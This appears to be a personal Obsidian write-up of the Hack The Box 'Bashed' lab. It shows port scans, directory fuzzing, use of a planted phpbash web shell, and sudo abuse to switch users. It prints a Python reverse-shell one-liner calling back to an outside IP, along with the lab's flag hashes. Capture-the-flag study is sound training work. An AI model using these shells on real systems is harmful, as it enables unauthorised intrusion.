---
creation date: May 30th 2023
last modified date: May 30th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[HTB - Bashed]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT   STATE SERVICE
80/tcp open  http
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80
- This pulls up a site that talks about a pentest tool that was designed on this server meaning it should be here somewhere!!
- Running a [[ffuf]] on the site we find a few subdomains that listed below:
```bash
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.164.26/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 50ms]
    * FUZZ: images

[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 47ms]
    * FUZZ: uploads

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 43ms]
    * FUZZ: php

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 45ms]
    * FUZZ: css

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 41ms]
    * FUZZ: dev

[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 47ms]
    * FUZZ: js

[Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 40ms]
    * FUZZ: fonts

[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 40ms]
    * FUZZ: 

[Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 45ms]
    * FUZZ: server-status
```
- Checking them all out we found our `phpbash.php` file that was talked about being under: `/dev/phpbash.php`


---

# Exploitation
## phpbash.php
- The site had a backdoor on it already using this we are able to have a shell to the sever.


---

# Lateral Movement to user
## Local Enumeration
- User: `www-data`
	- **sudo -l**
		- `(scriptmanager : scriptmanager) NOPASSWD: ALL`

- User: `scriptmanager`
	- Located a directory at: `/scripts` that this user can read-write-execute to
		- `test.py`
			- scriptmanager is owner
			- Looks like this edits the `test.txt` file meaning that it must have root access at some point
			- Changed this file out with a reverse shell: ![[Reverse Shell#Python]]
		- `test.txt`
			- root is owner

## Lateral Movement vector
- Initial shell at `http://$RHOST/dev/phpbash.php` gives us access to user: **www-data**
	- From this shell we can establish a more stable environment by calling back to our machine with:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.134",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- Then upgrade the shell for a few more amenities:
```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Run in the shell
export TERM=xterm-256color # whatever your original $TERM value is && Run in shell
ctrl + z
stty raw -echo ;fg # Run on our machine
```

- We located that www-data user can run sudo commands as `scriptmanager` this means we can spawn a shell under this user:
```bash
sudo -u scriptmanager /bin/bash
```



---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Trophy & Loot
user.txt
ec866881e77adb52c38db1456ceff191

root.txt
63d4bc81e56d6377936d9e5098e0a5df

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 30th 2023 (05:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
